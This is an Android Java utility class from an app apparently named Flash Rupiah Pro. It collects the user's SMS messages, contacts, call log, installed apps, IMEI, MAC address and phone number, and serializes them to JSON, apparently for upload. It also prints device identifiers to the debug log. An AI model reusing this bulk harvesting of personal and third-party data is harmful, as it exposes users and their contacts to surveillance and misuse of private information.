package com.flash.rupiah.pro.utils;


import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.flash.rupiah.pro.R;
import com.flash.rupiah.pro.bean.ContactUser;
import com.flash.rupiah.pro.bean.PhoneBean;
import com.flash.rupiah.pro.bean.PhoneDto;
import com.flash.rupiah.pro.bean.SmsInfo;
import com.google.gson.Gson;

import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * Created by heise on 2018/5/15.
 */

public class PhoneInfo {
    private static Uri smsUri = Uri.parse("content://sms/");
    private static String[] permissionList = new String[]{Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.SEND_SMS};
    public static final int MY_PERMISSIONS_REQUESTS = 0;

    /**
     * 获取电话号码
     */
    public static String getNativePhoneNumber(Activity context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context
                .TELEPHONY_SERVICE);
        String NativePhoneNumber = "";
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) !=
                PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, R.string.permission_fail, Toast.LENGTH_SHORT).show();
            return "";
        }
        NativePhoneNumber = telephonyManager.getLine1Number();
        Log.e("Log", NativePhoneNumber);
        return NativePhoneNumber;
    }

    public static String getMacAddr() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : all) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;

                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "";
                }

                StringBuilder res1 = new StringBuilder();
                for (byte b : macBytes) {
                    res1.append(String.format("%02X:", b));
                }

                if (res1.length() > 0) {
                    res1.deleteCharAt(res1.length() - 1);
                }
                Log.e("phoneInfo", "mac地址" + res1.toString());
                return res1.toString();
            }
        } catch (Exception ex) {
        }
        return "02:00:00:00:00:00";
    }

    /**
     * 获取所有非系统应用
     * 可以把代码中的判断去掉，获取所有的APP
     */
    public static String getAllApps(Context context) {
        Log.e("phoneInfo", "获取所有非系统应用");
        String result = "";
        PackageManager pManager = context.getPackageManager();
        //获取手机内所有应用
        List<PackageInfo> paklist = pManager.getInstalledPackages(0);
        for (int i = 0; i < paklist.size(); i++) {
            PackageInfo pak = (PackageInfo) paklist.get(i);
            //判断是否为非系统预装的应用程序
            if ((pak.applicationInfo.flags & pak.applicationInfo.FLAG_SYSTEM) <= 0) {
                // customs applications
                if (TextUtils.isEmpty(result)) {
                    result = pak.applicationInfo.loadLabel(pManager).toString();
                } else {
                    result = result + "," + pak.applicationInfo.loadLabel(pManager).toString();
                }
            }
        }
        Log.e("phoneInfo", "设备安装非系统应用信息：" + result);
        return result;
    }

    /**
     * 获取所有短信信息
     */
    public static String getSmsFromPhone(Activity context) {
        ArrayList<SmsInfo.DataBean> list = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) !=
                PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, R.string.permission_fail, Toast.LENGTH_SHORT).show();
            return "";
        }
        Cursor cur = cr.query(smsUri, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("ooc", "************cur == null");
            return "";
        }
        int count = 0;
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            int type = cur.getInt(cur.getColumnIndex("type"));//类型
            long date = cur.getLong(cur.getColumnIndex("date"));//时间
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            String typeString = "";
            switch (type) {
                case 1:
                    typeString = "MESSAGE_TYPE_INBOX";
                    break;
                case 2:
                    typeString = "MESSAGE_TYPE_SENT";
                    break;

            }
            SmsInfo.DataBean smsInfo = new SmsInfo.DataBean(name, number, body, "", typeString,
                    date);
            if (count < 50) list.add(smsInfo);
            count++;
        }
        SmsInfo smsInfo = new SmsInfo(0, 0, 0, System.currentTimeMillis(), "", "SMS_LOG",
                AppInfoUtils.packageCode(context) + "", list);
        Gson gson = new Gson();
        String str = gson.toJson(smsInfo);
        return str;
    }


    //获取所有联系人
    public static String getPhone(Activity context) {
        String NUM = ContactsContract.CommonDataKinds.Phone.NUMBER;
        String LASTUSED = ContactsContract.CommonDataKinds.Phone.LAST_TIME_USED;
        String LASTCONTACTED = ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED;
        String TIMES = ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED;
        // 联系人姓名
        String NAME = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME;
        //联系人提供者的uri
        Uri phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        List<PhoneDto.DataBean> dataBeans = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) !=
                PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, R.string.permission_fail, Toast.LENGTH_SHORT).show();
            return "";
        }
        Cursor cursor = cr.query(phoneUri, new String[]{NUM, NAME, LASTUSED, LASTCONTACTED,
                TIMES}, null, null, null);
        int count = 0;
        while (cursor.moveToNext()) {
            PhoneDto.DataBean dataBean = new PhoneDto.DataBean();
            dataBean.setName(cursor.getString(cursor.getColumnIndex(NAME)));
            List<PhoneDto.DataBean.NumberBean> listNum = new ArrayList<>();
            PhoneDto.DataBean.NumberBean numberBean = new PhoneDto.DataBean.NumberBean(cursor
                    .getString(cursor.getColumnIndex(NUM)), cursor.getInt(cursor.getColumnIndex
                    (TIMES)), "", cursor.getString(cursor.getColumnIndex(LASTUSED)));
            listNum.add(numberBean);
            dataBean.setNumber(listNum);
            dataBean.setLastUpdate(cursor.getString(cursor.getColumnIndex(LASTCONTACTED)));
            dataBean.setContact_times(cursor.getInt(cursor.getColumnIndex(TIMES)));
            dataBean.setRelation("");
            dataBean.setLast_contact_time(cursor.getString(cursor.getColumnIndex(LASTCONTACTED)));
            dataBeans.add(dataBean);
            count++;
        }
        PhoneDto phoneDto = new PhoneDto();
        phoneDto.setData(dataBeans);
        phoneDto.setEarliestTime("");
        phoneDto.setLatestTime(System.currentTimeMillis());
        phoneDto.setProtocolName("CONTACT");
        phoneDto.setProtocolVersion(AppInfoUtils.packageCode(context) + "");
        phoneDto.setTotalNumber(count);
        phoneDto.setVersionName("");
        Gson gson = new Gson();
        String str = gson.toJson(phoneDto);
        return str;
    }

    public static String getPhoneInfo(Activity activity) {
        String deviceType = Build.MODEL;
        String deviceBrand = Build.BRAND;
        String systemVersion = Build.VERSION.RELEASE;
        String versionName = AppInfoUtils.packageName(activity);
        String protocolVersion = AppInfoUtils.packageCode(activity) + "";
        PhoneBean phoneBean = new PhoneBean(deviceType, deviceBrand, systemVersion, versionName,
                protocolVersion);
        Gson gson = new Gson();
        return gson.toJson(phoneBean);
    }

    /**
     * 获取手机IMEI
     *
     * @param context
     * @return
     */
    public static final String getIMEI(Activity context) {
        try {
            //实例化TelephonyManager对象
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService
                    (Context.TELEPHONY_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                    == PackageManager.PERMISSION_GRANTED) {
                //获取IMEI号
                String imei = telephonyManager.getDeviceId();
                Log.e("phoneInfo", "imei" + imei.toString());
                //在次做个验证，也不是什么时候都能获取到的啊
                if (imei == null) {
                    imei = "";
                }
                return imei;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
        return "";
    }


    /**
     * 读取通话记录
     *
     * @return 读取到的数据
     */
    public static String getDataList(Activity context) {
        // 1.获得ContentResolver
        ContentResolver resolver = context.getContentResolver();
        // 2.利用ContentResolver的query方法查询通话记录数据库
        /**
         * @param uri 需要查询的URI，（这个URI是ContentProvider提供的）
         * @param projection 需要查询的字段
         * @param selection sql语句where之后的语句
         * @param selectionArgs    占位符代表的数据
         * @param sortOrder 排序方式
         *
         */
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) !=
                PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, R.string.permission_fail, Toast.LENGTH_SHORT).show();
            return "";
        }
        Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, // 查询通话记录的URI
                new String[]{CallLog.Calls.CACHED_NAME// 通话记录的联系人
                        , CallLog.Calls.NUMBER// 通话记录的电话号码
                        , CallLog.Calls.DATE// 通话记录的日期
                        , CallLog.Calls.DURATION// 通话时长
                        , CallLog.Calls.TYPE}// 通话类型`
                , null, null, null// 按照时间逆序排列，最近打的最先显示
        );
        // 3.通过Cursor获得数据
        List<ContactUser.DataBean> list = new ArrayList<>();
        int count = 0;
        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
            int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
            int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
            String typeString = "";
            switch (type) {
                case CallLog.Calls.INCOMING_TYPE:
                    typeString = "INCOMING_TYPE";
                    break;
                case CallLog.Calls.OUTGOING_TYPE:
                    typeString = "OUTGOING_TYPE";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    typeString = "MISSED_TYPE";
                    break;
                default:
                    break;
            }
            ContactUser.DataBean dataBean = new ContactUser.DataBean();
            dataBean.setName((name == null) ? "未备注联系人" : name);
            dataBean.setNumber(number);
            dataBean.setDuration((duration / 60) + "");
            dataBean.setDirection(typeString);
            dataBean.setCreateTime(dateLong + "");
            if (count < 50) {
                list.add(dataBean);
            }
            count++;
        }
        ContactUser contactUser = new ContactUser();
        contactUser.setData(list);
        contactUser.setEarliestTime("");
        contactUser.setLatestTime(System.currentTimeMillis());
        contactUser.setProtocolName("CALL_LOG");
        contactUser.setProtocolVersion(AppInfoUtils.packageCode(context) + "");
        contactUser.setTotalNumber(50);
        contactUser.setVersionName("");
        Gson gson = new Gson();
        String str = gson.toJson(contactUser);
        return str;
    }
}
